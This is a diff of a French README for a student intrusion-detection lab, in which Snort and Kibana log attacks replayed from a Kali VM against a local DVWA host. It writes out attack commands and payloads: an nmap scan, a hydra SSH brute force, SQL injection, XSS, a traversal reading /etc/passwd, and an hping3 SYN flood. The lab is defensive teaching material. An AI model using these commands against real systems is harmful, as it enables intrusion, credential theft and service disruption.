@@ -1,51 +1,48 @@
 # Utilisation
 
-## Démarrer le système
+## Démarrer le système (routine complète)
 
-### Snort (détection des intrusions)
-Sur la VM Ubuntu :
+### 1. Démarrer les deux VM
+Dans VirtualBox : démarrer la VM **Ubuntu**, puis la VM **Kali**.
+
+### 2. Vérifier les services (sur Ubuntu)
+Elasticsearch, Kibana et syslog-ng démarrent automatiquement. Mais on vérifie au cas où :
 ```bash
-sudo systemctl status snort
+sudo systemctl status elasticsearch kibana syslog-ng
 ```
-Si le service n'est pas actif :
+Les trois doivent être `active (running)`. Sinon :
 ```bash
-sudo systemctl start snort
+sudo systemctl start elasticsearch kibana syslog-ng
 ```
-Pour voir les alertes en temps réel pendant une démonstration (au lieu du mode
-service silencieux) :
+Kibana est accessible sur `http://localhost:5601` (patienter 1-2 minutes après le démarrage ça peut prendre plus ou moins de temps selon votre machine donc pas de panique).
+
+### 3. Lancer Snort en mode console (sur Ubuntu)
+C'est le mode qui alimente la collecte. Laisser ce terminal ouvert pendant toute la démonstration :
 ```bash
 sudo systemctl stop snort
 sudo snort -A fast -q -c /etc/snort/snort.conf -i enp0s8 -l /var/log/snort
 ```
-Les alertes s'affichent à l'écran et sont écrites dans `/var/log/snort/alert`.
-Arrêter avec `Ctrl+C`, puis relancer le service normal :
+
+### 4. Lancer les alertes e-mail (sur Ubuntu, 2e terminal)
 ```bash
-sudo systemctl start snort
+cd ~/alertes && python3 alerte.py
+```
+Le message « Surveillance démarrée... » s'affiche.
+
+### 5. Préparer DVWA (depuis Kali)
+Pour les scénarios 3 et 4, ouvrir `http://192.168.56.10/login.php` (identifiants `admin` / `password`), puis menu **DVWA Security -> Low -> Submit** (à refaire à chaque session).
+
+### Vérifier la connexion entre les VM (depuis Kali)
+```bash
+ping -c 3 192.168.56.10
 ```
 
 ---
 
-### RAPPEL : Vérifier la détection
-Sur Ubuntu :
+## Rejouer les attaques (depuis Kali)
 
-Après avoir lancer la commande : 
-```bash
-sudo snort -A fast -q -c /etc/snort/snort.conf -i enp0s8 -l /var/log/snort
-```
-faites le scénario de votre choix tout en laissant la commande d'au dessus tourner. Une fois ceci fait, faites CTRL+C puis : 
-```bash
-sudo sudo systemctl start snort
-sudo tail -20 /var/log/snort/alert
-```
-on peut choisir arbitrairement le nombre de ligne que l'on veut voir (20 ou 30 suffit en générale).
-
-## Rejouer les attaques (depuis la VM Kali)
-
-Prérequis : les deux VM (Ubuntu et Kali) doivent être démarrées et sur le même
-réseau privé hôte. Vérifier la connexion :
-```bash
-ping -c 3 192.168.56.10
-```
+> Snort doit tourner en mode console (étape 3) pendant chaque attaque.
+> Pour vérifier une détection, sur Ubuntu : `sudo tail -20 /var/log/snort/alert`
 
 ### Scénario 1 — Scan de ports (nmap)
 ```bash
@@ -54,36 +51,51 @@ nmap -sS 192.168.56.10
 
 ### Scénario 2 — Brute force SSH (hydra)
 ```bash
-hydra -l vboxuser -P petite-liste.txt -t 4 ssh://192.168.56.10
+hydra -l vboxuser -P /home/kali/petite-liste.txt -t 4 ssh://192.168.56.10
 ```
-*(`petite-liste.txt` : liste de mots de passe réduite, voir `scenarios/02-ssh-bruteforce.md`
-pour la générer à partir de rockyou.txt)*
+*(`petite-liste.txt` : liste réduite de mots de passe. Voir `scenarios/02-ssh-bruteforce.md` pour la générer. Le mot de passe du compte `vboxuser` y est ajouté pour démontrer l'intrusion réussie.)*
 
-### Scénario 3 — Injection SQL
-Depuis un navigateur sur Kali, se connecter à DVWA (`admin` / `password`,
-sécurité réglée sur Low), puis sur la page SQL Injection, entrer dans le champ
-User ID :
-
+### Scénario 3 — Injection SQL (DVWA)
+Sur DVWA, page **SQL Injection**, dans le champ **User ID** :
+```
 1' UNION SELECT user, password FROM users-- -
+```
+DVWA affiche la liste des utilisateurs et leurs mots de passe hashés.
 
-URL directe :
+### Scénario 4a — XSS (DVWA)
+Sur DVWA, page **XSS (Reflected)**, dans le champ :
+```
+<script>alert('XSS')</script>
+```
 
-http://192.168.56.10/vulnerabilities/sqli/
-
-### Scénario 4 — XSS et directory traversal
-
-Toujours sur DVWA, mais cette fois ci on travaille sur les sections "XSS (Reflective)" et "File Inclusion" (pas besoin de cliquer dessus, copier-coller les liens ci dessous devrait suffir) :
-
-http://192.168.56.10/vulnerabilities/xss_r/?name=<script>alert(‘XSS’)</script>
-http://192.168.56.10/vulnerabilities/fi/?page=../../../../etc/passwd
-
+### Scénario 4b — Directory traversal
+Depuis le terminal Kali (le navigateur nettoie les `../`, il faut `curl`) :
+```bash
+curl -g --path-as-is "http://192.168.56.10/vulnerabilities/fi/?page=../../../../etc/passwd"
+```
 
 ### Scénario 5 — SYN flood (hping3)
 ```bash
 sudo hping3 -S --flood -p 80 192.168.56.10
 ```
-Laisser tourner 5 à 10 secondes puis `Ctrl+C`. Attention : peut ralentir la VM
-Ubuntu, c'est l'effet recherché.
+Laisser tourner **5 secondes maximum**, puis **Ctrl+C**.
+La raison est que cette attaque sature volontairement la VM Ubuntu et peut faire ralentir Kibana. Ne pas la laisser tourner trop longtemps. (Des tests ont même fait complètement stoppé Ubuntu au point où il fallait redémarrer la VM ainsi que Kibana)
 
+---
 
 ## Voir les résultats dans Kibana
+
+Ouvrir `http://localhost:5601` -> menu **Discover** -> Data View **Projet Secu** -> période **Last 15 minutes**.
+
+Filtrer par attaque dans la barre de recherche :
+
+| Scénario | Filtre |
+|---|---|
+| 1 — Scan | `snort.signature : "SCAN Possible nmap scan detecte"` |
+| 2 — Brute force SSH | `snort.signature : "SSH Brute Force attempt"` |
+| 3 — Injection SQL | `snort.signature : "SQL Injection attempt detecte"` |
+| 4a — XSS | `snort.signature : "XSS attempt detecte"` |
+| 4b — Directory traversal | `snort.signature : "Directory Traversal attempt detecte"` |
+| 5 — SYN flood | `snort.signature : "DOS SYN Flood attempt detecte"` |
+
+Pour voir toutes les attaques d'un coup (sans le bruit réseau) : `snort.sid >= 1000002`.
